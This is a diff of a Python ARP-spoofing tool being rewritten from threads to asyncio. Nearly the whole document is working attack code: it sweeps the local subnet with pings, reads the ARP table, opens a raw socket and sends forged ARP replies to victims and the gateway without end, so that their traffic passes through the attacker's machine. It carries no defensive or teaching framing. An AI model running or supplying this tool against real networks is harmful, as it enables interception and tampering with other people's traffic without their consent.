@@ -1,218 +1,226 @@
 #!/usr/bin/python3
 
 import re
-import os
-import time
 import socket
-import threading
+import asyncio
+import aioping
 import binascii
-import netifaces
 import argparse
-
-from subprocess import Popen, PIPE
-
-
-subnet = "192.168.1.0/24"
-interfaces = netifaces.interfaces()
-
-interface = None
-gateway = None
-mac = None
-
-victims = []
-threads = []
-_output = []
+import netifaces
 
 
-class attackThread(threading.Thread):
-	def __init__(self, victim, gateway,  mac, connect):
-		threading.Thread.__init__(self)
-		self.victim = victim
-		self.connect = connect
+ARP_FILE = "/proc/net/arp"  # ARP table file
+ARP_PACKET = b'\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02'  # ARP Packet
+PROTOCOL_IPV4 = socket.htons(0x0800)  # Ethernet II Protocol
 
-		mac = encode_mac(mac)
-		mac_victim = get_mac(victim)
+PING_TIMEOUT = 2  # Response timeout in ping (seconds)
+REQUEST_DELAY_CLIENT = 0  # ARP request delay for client (seconds)
+REQUEST_DELAY_GATEWAY = 0.3 # ARP request delay for gateway (seconds)
 
-		self.request = mac_victim + mac + b'\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01' + mac
-		self.request += socket.inet_aton(gateway) + mac_victim + socket.inet_aton(victim)
 
-	def run(self):
+# Regular expression patterns
+class Pattern:
+	IPV4 = r'\d+\.\d+\.\d+\.\d+'
+	MAC = r'(?:[0-9a-fA-F]:?){12}'
+
+
+class ARP:
+	Table = []
+
+	def __packet_generate(sender_mac, target_mac, sender_ip, target_ip):
+		sha = Network.encode_mac(sender_mac)
+		tha = Network.encode_mac(target_mac)
+
+		spa = socket.inet_aton(sender_ip)
+		tpa = socket.inet_aton(target_ip)
+
+		return tha + sha + ARP_PACKET + sha + spa + tha + tpa
+
+	async def spoofing(connect, victim, gateway, interface_mac, delay):
+		packet = ARP.__packet_generate(interface_mac, victim[1], gateway[0], victim[0])
+
 		while True:
-			self.connect.send(self.request)
-			print("ARP packet send to " + self.victim + " (0x0806), operation code 0x0001")
-			time.sleep(0.3)
+			connect.send(packet)
+
+			print(f"ARP packet send to {victim[0]} ({victim[1]}), operation REPLY (0x0002)")
+			await asyncio.sleep(delay)
+
+	def get_connect(interface):
+		connect = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, PROTOCOL_IPV4)
+		connect.bind((interface, PROTOCOL_IPV4))
+
+		return connect
+
+	def get_table():
+		with open(ARP_FILE) as arp:
+			ARP.Table = []
+
+			for line in arp.readlines():
+				ip = re.search(r'\d+\.\d+\.\d+\.\d+', line)
+				mac = re.search(r'(?:[0-9a-fA-F]:?){12}', line)
+
+				if ip and mac and mac.group(0) != "00:00:00:00:00:00":
+					ARP.Table.append((ip.group(0), mac.group(0)))
+
+		return ARP.Table
+
+	def get_mac(ipv4):
+		for client in ARP.Table:
+			if client[0] == ipv4:
+				return client[1] 
+
+		return False
 
 
-def attack(ips):
-	global threads, mac, gateway, interface
+class Network:
+	def encode_mac(address):
+		return binascii.unhexlify(address.strip().replace(':', ''))
 
-	protocol = socket.htons(0x0800)
-	connect = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, protocol)
-	connect.bind((interface, protocol))
+	def get_interface_mac(interface):
+		return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
 
-	for victim_ip in ips:
-		threads.append(attackThread(victim_ip, gateway, mac, connect))
-		threads.append(attackThread(gateway, victim_ip, mac, connect))
-		time.sleep(0.4)
+	def get_interface_ipv4(interface):
+		return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]
 
-	for th in threads:
-		th.start()
+	def get_interface_gateway(interface):
+		gateways = netifaces.gateways()[netifaces.AF_INET]
+
+		for gateway in gateways:
+			if gateway[1] == interface:
+				return gateway
+
+		return None
+
+	def get_interfaces():
+		return netifaces.interfaces()
+
+	def get_gateways():
+		return netifaces.gateways()[netifaces.AF_INET]
+
+	def get_default_gateway():
+		return netifaces.gateways()["default"][netifaces.AF_INET]
+
+	async def ping(host, timeout = 2, subnet = False):
+		if subnet:
+			mask = '.'.join(host.split('.')[:-1])
+			tasks = [asyncio.create_task(Network.ping(f"{mask}.{net}")) for net in range(1, 255)]
+
+			await asyncio.wait(tasks)
+
+		else:
+			try:
+				await aioping.ping(host, timeout=timeout)
+
+			except TimeoutError:
+				pass
 
 
-def main():
-	global interface, victims, gateway, mac
-	args = arguments()
+async def attack(victims, gateway, interface):
+	connect = ARP.get_connect(interface)
+	interface_mac = Network.get_interface_mac(interface)
+	tasks = []
 
-	interface = args.interface
-	gateway = interface_enabled(interface)
+	for victim in victims:
+		if victim != gateway:
+			tasks.append(
+				asyncio.create_task(ARP.spoofing(connect, victim, gateway, interface_mac, REQUEST_DELAY_CLIENT)))
+			tasks.append(
+				asyncio.create_task(ARP.spoofing(connect, gateway, victim, interface_mac, REQUEST_DELAY_GATEWAY)))
 
-	if gateway is None:
-		print(f"Interface {interface} not found.")
+	await asyncio.wait(tasks)
+
+
+async def local_scanner(gateway):
+	result = []
+	interface_ip = Network.get_interface_ipv4(gateway[1])
+
+	await Network.ping(gateway[0], timeout=PING_TIMEOUT, subnet=True)
+	ARP.get_table()
+
+	for client in ARP.Table:
+		if client not in [interface_ip, gateway[0]]:
+			print(f" -- {client[0]} ({client[1]})")
+			result.append(client)
+
+	if result == []:
+		print("No hosts found on your local network. Try again..")
 		raise KeyboardInterrupt
 
-	mac = my_mac(interface)
+	else:
+		answer = input("\nContinue? [Y/n] ")
 
-	try:
-		if args.target is None:
-			raise IndexError
-
-		with open(args.target, 'r') as file:
-			for line in file.readlines():
-				ip = line.strip()
-
-				if check_ip(ip):
-					victims.append(ip)
-
-				else:
-					print(f"Invalid IP - {ip}")
-
-		if len(victims) < 1:
-			print("No valid IP's in your file.")
+		if answer not in ['Y', 'y']:
 			raise KeyboardInterrupt
 
-	except IndexError:
-		print("Scanning computers in local network..")
-		scanner(subnet)
-
-	print("Starting ARP spoofing..")
-	attack(victims)
+	return result
 
 
-def arguments():
+async def main():
+	victims = []
+	args = parse_arguments()
+
+	if args.ping:
+		PING_TIMEOUT = args.ping
+
+	if args.interface:
+		gateway = Network.get_interface_gateway(args.interface)
+
+		if gateway is None:
+			print(f"Interface {args.interface} not enabled.")
+			raise KeyboardInterrupt
+
+	else:
+		gateway = Network.get_default_gateway()
+		print(f"Interface {gateway[1]} used.")
+
+	if args.target:
+		print("")
+
+		with open(args.target) as file:
+			ARP.get_table()
+
+			for client in file.readlines():
+				ipv4 = client.strip()
+
+				await Network.ping(ipv4, timeout=5)
+				mac = ARP.get_mac(ipv4)
+
+				if mac:
+					victims.append((ipv4, ARP.get_mac(ipv4)))
+					print((ipv4, mac))
+
+				else:
+					print(f" -- {ipv4} (Invalid IPv4)")
+
+		if len(victims) < 1:
+			print("\nNo valid IPs were found in your file.")
+			raise KeyboardInterrupt
+
+	else:
+		print("Scanning computers in local network..\n")
+		victims = await local_scanner(gateway)
+
+	gateway_mac = ARP.get_mac(gateway[0])
+	await attack(victims, (gateway[0], gateway_mac), gateway[1])  # Victims List; Gateway (IP, MAC), Interface
+
+
+def parse_arguments():
 	parser = argparse.ArgumentParser()
-	parser.add_argument('-i', '--interface', required=True, dest="interface", help="Set a interface")
-	parser.add_argument('-t', '--target', dest="target", help="Set a file with local IPs")
+
+	parser.add_argument('-i', '--interface', dest="interface", help="Set interface or use default")
+	parser.add_argument('-t', '--target', dest="target", help="Target's list file")
+	parser.add_argument('-p', '--ping-delay', dest="ping", help="Custom ping delay for scanning (default: 2s)")
 
 	return parser.parse_args()
 
 
-def scanner(ip):
-	global victims, interface, gateway, subnet
-
-	victims = local_ping_scanner(subnet)
-	local_ip = my_ip(interface)
-	result = []
-
-	print("")
-	for element in victims:
-		if element != gateway and element != local_ip:
-			result.append(element)
-			print(" -- " + element)
-
-	if len(result) < 1:
-		print("No computers found on the local network, try again.")
-		raise KeyboardInterrupt
-
-	else:
-		print("")
-		answer = input("Continue? [Y/n] ").lower()
-
-		if answer != 'y':
-			raise KeyboardInterrupt
-
-	victims = result
-	return victims
-
-
-class pingThread(threading.Thread):
-	def __init__(self, address):
-		threading.Thread.__init__(self)
-		self.address = address
-
-	def run(self):
-		response = ping(self.address)
-
-		if "ttl" in response.read().lower():
-			_output.append(self.address)
-
-
-def ping(hostname):
-	return os.popen(f"ping -c 1 {hostname}")
-
-
-def local_ping_scanner(mask):
-	global _output
-
-	subnet ='.'.join(mask.split('.')[:-1])
-	ths = []
-
-	for net in range(1, 255):
-		th = pingThread(subnet + '.' + str(net))
-		ths.append(th)
-
-	for th in ths:
-		th.start()
-
-	o = _output
-	_output = []
-
-	return o
-
-
-def check_ip(ip):
-	try:
-		socket.inet_aton(ip)
-		return True
-
-	except socket.error:
-		return False
-
-
-def get_mac(local_ip):
-	ping(local_ip)
-
-	pid = Popen(["arp", "-a", local_ip], stdout=PIPE)
-	spid = pid.communicate()[0].decode()
-	local_mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", spid).groups()[0]
-
-	return encode_mac(local_mac)
-
-
-def encode_mac(address):
-	return binascii.unhexlify(address.strip().replace(':', ''))
-
-
-def my_mac(interface):
-	return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
-
-
-def my_ip(interface):
-	return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]
-
-
-def interface_enabled(interface):
-	gateways = netifaces.gateways()["default"]
-
-	for i in gateways:
-		if gateways[i][1] == interface:
-			return gateways[i][0]
-
-	return None
-
-
 if __name__== "__main__":
+	loop = asyncio.new_event_loop()
+	asyncio.set_event_loop(loop)
+
 	try:
-		main()
+		loop.run_until_complete(main())
 
 	except KeyboardInterrupt:
+		loop.close()
 		print("Attack was stopped.")
